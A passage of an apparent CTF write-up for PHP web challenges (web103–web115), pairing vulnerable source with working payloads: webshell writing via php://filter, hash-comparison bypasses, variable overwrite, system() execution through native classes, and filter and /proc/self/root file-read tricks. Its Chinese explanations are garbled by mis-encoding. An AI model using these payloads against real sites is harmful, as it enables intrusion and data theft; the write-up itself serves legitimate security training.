class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>php5ä¸‹is_numericå¯è¯†åˆ«16è¿›åˆ¶ï¼Œå¦‚0x2eï¼Œç„¶åè°ƒç”¨hex2binè½¬æˆå­—ç¬¦ä¸²å†™å…¥æœ¨é©¬ï¼Œä½†é¢˜ç›®ç¯å¢ƒæ˜¯php7,æ‰€ä»¥è¦å¦æ¢æ–¹æ³•ã€‚ç”¨ä¼ªåè®®å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦base64ç¼–ç åè½¬æˆ16è¿›åˆ¶å…¨æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²ã€‚</p></blockquote><p>æ„é€ å‡ºæœ¨é©¬</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">//PD89YGNhdCAqYDs=</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;PD89YGNhdCAqYDs&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$c</span>);  <span class="comment">//5044383959474e6864434171594473</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬é¢˜ç›®ä¸­<code>sub_str</code>å‰é¢ä¸¤ä¸ªå­—ç¬¦ä¸è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">POST:v1=hex2bin</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>1.php</code>å¹¶æŸ¥çœ‹æºç å³å¯</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ•°ç»„ç»•è¿‡æˆ–è€…<code>0e</code>å¼€å¤´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v2[]=2</span><br><span class="line">POST:v1[]=1</span><br><span class="line"></span><br><span class="line">/?v2=aaroZmOk</span><br><span class="line">POST:v1=aaK1STfY</span><br></pre></td></tr></table></figure><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å˜é‡è¦†ç›–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?tmp=flag</span><br><span class="line">POST:error=tmp</span><br><span class="line"></span><br><span class="line">/?suces=flag&amp;flag=</span><br></pre></td></tr></table></figure><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v2[]=2</span><br><span class="line">POST:v1[]=1</span><br><span class="line"></span><br><span class="line">/?v2=aaroZmOk</span><br><span class="line">POST:v1=aaK1STfY</span><br></pre></td></tr></table></figure><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v3[]=1</span><br><span class="line">POST:v1[flag][]=1</span><br><span class="line"></span><br><span class="line">/?v3=QNKCDZO</span><br><span class="line">POST:v1=flag=0</span><br></pre></td></tr></table></figure><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨<code>%00</code>æˆªæ–­å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=a%00778</span><br></pre></td></tr></table></figure><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯»æ‰¾ä¸€äº›å¯ç”¨çš„PHPåŸç”Ÿå†…é…¯ç±»ï¼Œechoä¼šä½¿å¾—<code>$v1</code>ç±»è§¦å‘<code>__toString()</code>ï¼Œä¼ é€’çš„å‚æ•°v2åˆ™ä¼šè¢«è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=CachingIterator&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br><span class="line">/?v1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨FilesystemIteratoræ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨ï¼Œé€šè¿‡æ–°å»ºFilesystemIteratorï¼Œä½¿ç”¨getcwd()æ¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è®¿é—®<code>fl36dga.txt</code>å³å¯</p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/resource=flag.php</span><br><span class="line">/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">/?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">/?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨Linuxä¸­ï¼Œ<code>/proc/self/root</code>ä»£è¡¨çš„æ˜¯æ ¹ç›®å½•ï¼Œå¯ä»¥å¤šæ¬¡é‡å¤æ¥ä½¿å‡½æ•°æº¢å‡ºï¼Œrequire_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶ once çš„ hash åŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=compress.zlib://flag.php</span><br><span class="line"></span><br><span class="line">/?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸‹å¯ç”¨å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span 